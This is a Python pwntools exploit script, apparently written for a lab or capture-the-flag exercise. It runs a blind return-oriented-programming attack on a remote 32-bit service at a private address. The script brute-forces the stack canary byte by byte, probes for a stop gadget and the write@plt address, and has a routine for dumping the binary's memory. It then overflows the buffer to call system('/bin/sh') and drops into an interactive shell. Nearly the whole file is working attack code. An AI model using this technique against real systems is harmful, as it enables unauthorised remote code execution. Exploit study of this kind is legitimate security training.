from pwn import *
import code
import sys

#context.log_level = 'DEBUG'

p = null

def round_up(val):
    for i in range(val, val + 16):
        if i % 16 == 0:
            break
    return i

def get_canary_entry():
    for i in range(100):
        payload = 'A'
        payload += 'A'*i
        size = len(payload) - 1

        p.recvuntil("darker:")
        p.send(payload)
        p.recvline()
        output = p.recvline()

        if output[1] == '-':
            log.info("get_canary_entry: fail: %d" % size)
        elif output[1] == '+':
            log.info("get_canary_entry: success: %d" % size)
            return size

def get_canary(buf_size):
    canary = [ 0x00, 0x00, 0x00, 0x00]
    payload = 'A' * buf_size

    for i in range(4):   # 4 bytes
        for j in range(256): # 256 possibilities
            payload = 'A' * buf_size 
            for k in range(i+1): # already conformed canary bytes
                payload += p8(canary[k])
            
            p.recvuntil("darker:")
            p.send(payload)
            p.recvline()
            output = p.recvline()
            if output[1] == '+':
                #log.info("get_canary: fail! byte index: %d, byte val: %#x" % (i, canary[i]) )
                canary[i] += 1
            elif output[1] == '-':
                log.info("get_canary: success! byte index: %d, byte val: %#x" % (i, canary[i]))
                break
    
    return ''.join(p8(i) for i in canary)

def get_stop_addr(buf_size, canary):
    #addr = 0x80486a0

    for addr in range(0x80486d1, 0x80489a1):
        sleep(0.1)
        payload  = 'A'*buf_size
        payload += canary 
        payload += p64(0xdeadbeef)
        payload += p32(0xdead)
        payload += p32(addr)

        p.recvuntil("darker:")
        p.send(payload)
        p.recvline()
        output = p.recv()
        
        #print("address: \n")
        #print(output)

        # if(output[1] == '+'):
        #     log.info("get_stop_addr: fail: 0x%x" % addr)
        # elif(output[1] == '-'):
        #     log.info("stop gadget addr: 0x%x" % addr)
        #     return addr
        # else:
        #     log.info("get_stop_addr: cannot connect")
        #     addr -= 1

def get_write_plt(buf_size, canary, stop_addr):
    addr = stop_addr

    log.info("address: 0x%x" % addr)

    #addr = 0x8048b98
    while True:
        sleep(0.1)
        addr += 1

        payload  = 'A'*buf_size
        payload += canary
        payload += p32(addr)
        payload += p32(stop_addr)
        payload += p32(0x1)
        payload += p32(0x8048000)
        payload += p32(0x1000)

        s = p.recvuntil("darker:")
        p.send(payload)
        p.recvline()
        if p.recv().startswith("\x7fELF"):
            log.info("wirtes@plt address: 0x%x" % addr)
            return addr
        # else:
        #     log.info("get_write_plt: fail: 0x%x" % addr)

def dump_memory(buf_size, canary, stop_addr, write_plt, start_addr, size):
    result = ""
    #print(result.encode('hex'))
    sleep(0.1)
    payload = 'A'*buf_size
    payload += canary
    payload += p64(0xdeadbeef)
    payload += p32(0xdead)
    payload += p32(write_plt)
    payload += p32(stop_addr)
    payload += p32(0x1)
    payload += p32(start_addr)
    payload += p32(size)

    p.recvuntil("darker:")
    p.send(payload)
    p.recv()
    data = p.recv(timeout=0.1)

    if data == "\n":
        data = '\x00'
    elif data[-1] == '\n':
        data = data[:-1]

    result += data
    return result



#if __name__=="__main__":
sys.stdout = open('log', 'w')

base_addr = 0x8048000

p = remote("10.15.201.97", 8090)
p.recvuntil('ID:')
p.sendline('3180103650')


#buf_size = get_canary_entry()
buf_size = 16


canary = get_canary(buf_size)

#code.interact(local=locals())

context.log_level  ='DEBUG'
#stop_addr = get_stop_addr(buf_size , canary)
stop_addr = 0x80486cf


#log.info("BEGIN TO FIND WRITE@PLT!")
#write_plt = get_write_plt(buf_size, canary, stop_addr)
write_plt = 0x8048560

start_addr = 0x8048000
size = 0x1000

# code_bin = dump_memory(buf_size, canary, stop_addr, write_plt, start_addr, size)
# with open('code.bin', 'wb') as f:
#     f.write(code_bin)
#     f.close()

base_addr = 0x8048000

bin_sh = 0x00ba8 + base_addr
system = 0x00520 + base_addr


payload  = 'A'*buf_size
payload += canary
payload += p64(0xdeadbeef)
payload += p32(0xdeadbeef)
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

p.recvuntil("darker:")
p.sendline(payload)
p.recv()
p.interactive()



        
